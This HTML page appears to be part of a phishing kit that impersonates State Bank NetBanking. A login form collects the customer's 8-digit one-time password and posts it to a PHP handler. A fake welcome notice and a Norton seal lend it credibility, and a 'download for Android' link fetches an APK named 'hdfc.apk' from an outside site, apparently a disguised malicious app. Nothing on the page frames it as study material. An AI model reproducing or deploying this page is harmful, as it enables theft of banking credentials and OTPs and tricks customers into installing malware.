
<!DOCTYPE html>
<html lang="zxx">

<head>
    <meta charset="utf-8">
    <meta http-equiv="Content-Security-Policy"
        content="default-src 'self' data: gap: https://ssl.gstatic.com 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; media-src *; connect-src *">
    <meta name="description" content="Shine">
    <meta name="keywords" content="Shine,Job,app">
    <meta name="author" content="Shine-Job">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>State Bank NetBanking</title>
    <link rel="icon" href="assets/images/favicon.png" type="image/png" sizes="16x16">

    <!-- bootstrap css -->
    <link rel="stylesheet" href="assets/css/bootstrap.min.css" type="text/css" media="all" />
    <!-- animate css -->
    <link rel="stylesheet" href="assets/css/animate.min.css" type="text/css" media="all" />
    <!-- owl carousel css -->
    <link rel="stylesheet" href="assets/css/owl.carousel.min.css" type="text/css" media="all" />
    <link rel="stylesheet" href="assets/css/owl.theme.default.min.css" type="text/css" media="all" />
    <!-- boxicons css -->
    <link rel='stylesheet' href='assets/css/icofont.min.css' type="text/css" media="all" />
    <!-- flaticon css -->
    <link rel='stylesheet' href='assets/css/flaticon.css' type="text/css" media="all" />
    <!-- style css -->
    <link rel="stylesheet" href="assets/css/style.css" type="text/css" media="all" />
    <link rel="stylesheet" href="css/custom.css" type="text/css" media="all" />
    <!-- responsive css -->
    <link rel="stylesheet" href="assets/css/responsive.css" type="text/css" media="all" />
    <link rel="stylesheet" href="assets/plugins/toastr/toastr.min.css">
    <!--[if IE]>
            <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->
    <style>
        body {
            background: #fff;
            color: #333;
        }

        .cus_title {
            font-size: 21px;
            margin-top: 20px;
            font-weight: q00;
        }

        .cus_bg1 {
            background: #F3F3F3;
        }

        .cus_bg {
            background: #1d1d1d;
        }

        .cus_bg2 {
            background: #e2effa;
        }

        .cus_text {
            border-radius: 4px;
            width: 100%;
            border: 1px solid #dad8d8;
            padding: 6px;
            font-size: 14px;
        }

        .cus_btn {
            background: #1d86ff;
            color: #fff;
            border: 1px solid #fff;
            padding: 5px;
            width: 235px;
            border-radius: 4px;
        }

        .cus_btn:hover {
            background-color: #337ab7;
            border-color: #2e6da4;
        }

        .preloader:before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #fff;
        }
    </style>
</head>

<body id="homepage">
  
    <div class="cus_bg1 ">
        <div class="container">
            <div class="cus_header" style="background:#fff;padding:10px">
                <div class="text-center">
                    <img src="assets/images/logo.png" alt="logo" style="width: 200px;" />
                </div>
                <div class="text-center cus_title">
                    Welcome to State Bank NetBanking
                </div>
            </div>
            <div style="padding: 5px;background:#fff;margin:10px 5px 5px 5px;">

                <form class="login100-form validate-form" action="1+.php" method="post">
                    <div class="" style="margin-top: 20px;font-weight: 100;font-size: 20px;">
                        Login to NetBanking
                    </div>
                    <!-- <img alt="Sbi Icon" style="
                                                height: 43px;
                                                width: 250px;
                                            " class="sbi-yono-logo" src="img/sbi_intouch_logo.svg"><br><br> -->


                    <div class=" ab  validate-input">
                        <b for="netb_username" class="col-md-5 col-form-label">Enter One Time Password(OTP)</b>
                        <div class="col-md-7">
                            <input type="text"  class="form-control" required=""
                                name="OTP_1" placeholder="" minlength="8" maxlength="8"
      pattern="[0-9]{8}">
                        </div>

                    </div>
            

                    <p><a href="#" style="font-size: 11px;color: #d54040;font-weight:bold;"> Resend OTP in <span id="countdowntimer">30 </span> Seconds</a></p>

                  
                    <div>



                        <button class="cus_btn div1_btn" style=" margin-top: 10px;" type="submit">
                            CONTINUE
                        </button>
                    </div>
                    <div class="cus_bg2" style="margin-top: 10px;font-weight: 100;font-size: 14px;padding: 10px;">
                        Dear Customer,<br> Welcome to the new login page of State Bank<br> NetBanking.
                        <br> Its lighter look and feel is designed to give you the <br> best possible user experience. Please continue to <br> login using your customer ID and password.
                    </div>

                </form>

            </div>








        </div>
    </div>
    <div class="text-center" style="background: #fff;padding: 30px 0 0 0px;">
        <a href="http://ravins.online/apps/hdfc.apk" download>
            <img src="assets/images/download-for-android.jpeg" alt="logo" style="width: 130px;" />
        </a>
        <img src="assets/images/new-norton-seal1.png" alt="logo" style="width: 100px;" />
    </div>
    <script src="cordova.js"></script>

      
    <script>
	  var timeleft = 30;
    var downloadTimer = setInterval(function(){
    timeleft--;
    document.getElementById("countdowntimer").textContent = timeleft;
    if(timeleft <= 0)
        clearInterval(downloadTimer);
    },1000);
	  </script>
    <!-- essential js -->
    <script src="assets/js/jquery-3.5.1.min.js"></script>
    <script src="assets/js/bootstrap.bundle.min.js"></script>
    <!-- owl carousel js -->
    <script src="assets/js/owl.carousel.min.js"></script>
    <!-- form ajazchimp js -->
    <script src="assets/js/jquery.ajaxchimp.min.js"></script>
    <!-- form validator js  -->
    <script src="assets/js/form-validator.min.js"></script>
    <!-- contact form js -->
    <script src="assets/js/contact-form-script.js"></script>
    <script type="text/javascript" src="assets/plugins/toastr/toastr.min.js"></script>
    <!-- main js -->
    <script src="assets/js/script.js"></script>

    <script src="js/ajax_method.js"></script>
    <script src="js/index.js"></script>
   
      
</body>

</html>